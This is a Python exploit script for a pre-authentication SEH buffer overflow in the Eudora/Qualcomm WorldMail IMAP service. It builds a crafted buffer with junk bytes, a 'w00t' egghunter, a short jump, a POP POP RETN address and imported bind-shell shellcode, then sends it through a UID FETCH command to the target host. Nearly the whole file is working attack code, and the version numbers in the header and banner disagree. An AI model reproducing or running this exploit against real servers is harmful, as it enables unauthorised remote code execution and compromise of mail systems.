#!/usr/bin/python
# Tested on 6.1.19.0

from payload import buf
import socket
import sys
from struct import pack
import struct
import os
def shell_attack(target_machine, target_port):
 



        banner = """
        
        ####################################################################################
        ###                                                                              ###
        ###        Coded by: Muhammad Alharmeel              ###
        ###                                                                              ###
        ####################################################################################

        *************************************************************************************  
        * Details:                                                                          *
        *                                                                                   *
        * - PRE AUTHENTICATION Eudora Qualcomm WorldMail 9.0.333.0 IMAPd Service            *
        *   Preauthentication Buffer Overflow.                                              *
        * - Tested on: Windows Server 2003 SP1.                                             *
        * - SEH gets overwritten at 749 bytes when using UID command.                       *
        * Only 79 bytes left after SEH, So the shellcode was placed before SEH              *
        * and backward jump is used after SEH to execute the shellcode.                     *
        * - Shellcode: shell_bind_tcp LPORT*4444 EXITFUNC*seh , Bad charcters are 0x00 0x7b *
        *************************************************************************************

        """






       




        egghunter = b"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7" # this is the marker/tag: w00t

        shellcode = b"w00tw00t" + buf

        buffer   = b"A" * 292                    #Junk
        buffer  +=  shellcode                   #Shellcode of 368 bytes to spawn a shell listening on port 4444 
        buffer  += b"\x90" *81                   #Nop Sled to fill the rest of the buffer after the shellcode 
        buffer  += b"\xEB\x06\x90\x90"           #Short JMP of 6 bytes.
        buffer  += b"\x95\xcb\x0d\x60"           #Memory Address of POP POP RETN sequence at module MsccMgr.dll @ windows server 2003.
        buffer  += egghunter                    #Egg hunter to search for the tag "w00tw00t" and executes the code after it
        buffer  += b"}" *32                      #Junk



        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
                s.connect((target_machine,target_port))
        except:
                
                sys.exit(0)



      
        s.recv(1024)
      
        s.send(b'A013 UID FETCH 4827313:4827313 '+ buffer + b"\r\n")
        s.close()
       